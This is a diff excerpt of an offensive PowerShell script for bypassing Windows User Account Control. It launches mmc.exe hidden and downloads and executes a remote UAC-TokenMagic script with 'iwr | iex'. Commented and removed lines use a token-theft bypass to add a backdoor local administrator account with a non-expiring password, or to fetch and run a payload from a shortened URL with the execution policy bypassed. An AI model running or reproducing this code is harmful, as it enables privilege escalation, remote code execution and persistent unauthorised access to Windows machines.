@@ -1532,11 +1532,12 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
 	   
             IEX $('Start-Process -WindowStyle hidden -FilePath ' + $env:SystemRoot + '\System32\mmc.exe gpedit.msc')
  	    #IEX $($env:SystemRoot + '\System32\cmd.exe') 			
-	    IEX $('Start-Process -w hidden -FilePath ' + $env:SystemRoot + '\System32\WindowsPowerShell\v1.0\powershell.exe -C')
+	    #IEX $('Start-Process -w hidden -FilePath ' + $env:SystemRoot + '\System32\WindowsPowerShell\v1.0\powershell.exe -C')
 	    
 	    iwr https://raw.githubusercontent.com/H0K5/PowerShell-Suite/master/UAC-TokenMagic.ps1 | iex
 #UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c net user google passwd /add /y /expires:never & net localgroup Administrateurs google /add" -ProcPID (ps -Name mmc).id
-UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c 'powershell -ep bypass -nop -C iwr https://goo.gl/xXZGMs | iex'" -ProcPID (ps -Name mmc).id
+
+#UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c 'powershell -ep bypass -nop -C iwr https://goo.gl/xXZGMs | iex'" -ProcPID (ps -Name mmc).id
 
 #IEX $($env:SystemRoot + "\System32\cmd.exe /c 'net user google passwd /add /y /expires:never & net localgroup Administrateurs google /add'")
 		        #IEX $($env:SystemRoot + '\regedit.exe')
